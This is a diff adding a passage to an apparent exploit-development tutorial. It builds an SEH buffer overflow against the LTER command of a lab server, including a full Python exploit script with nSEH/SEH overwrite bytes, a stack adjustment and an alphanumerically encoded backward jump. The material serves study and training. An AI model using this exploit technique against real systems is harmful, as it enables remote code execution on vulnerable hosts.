@@ -381,6 +381,66 @@ And let's run it and see how well we did. If all went well, when we step through
 
 ![](/assets/images/CTP/LTERespalign.JPG)
 
+As you can see we were successful! 
+
+### Encoding/Decoding a Short Jump Backwards
+
+Now that we know where our decoded shellcode will appear (visually right above `ESP`), we are free to put our encoded jump backwards into our shellcode. After feeding the shellcode `\xeb\x80\x90\x90` to Slink, we get the following encoded payload: 
+```terminal_session
+jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
+jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
+jump += "\x50"
+```
+
+So let's add this to our payload, which now looks like this:
+```python
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host = "192.168.1.201"
+port = 9999
+
+nSeh = '\x74\x06\x75\x04'
+Seh = '\x2b\x17\x50\x62'
+espAdj = '\x54\x58\x66\x05\x4b\x13\x50\x5C'
+jump = ""
+jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
+jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
+jump += "\x50" 
+
+
+buffer = 'A' * 3514
+buffer += nSeh
+buffer += Seh
+buffer += espAdj
+buffer += jump
+buffer += 'D' * (4000 - len(buffer))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+s.send("LTER /.../" + buffer)
+print s.recv(1024)
+s.close()
+```
+
+Let's send this and do a before and after for our Encoded/Decoded payload. If it is done correctly, a red `JMP` instruction should pop out of thin air visually on top of `ESP` once we execute the last part, the `\x50` (push `EAX`). 
+
+**BEFORE**
+
+![](/assets/images/CTP/LTERb4.JPG)
+
+**AFTER**
+
+![](/assets/images/CTP/LTERafter.JPG)
+
 
 
 
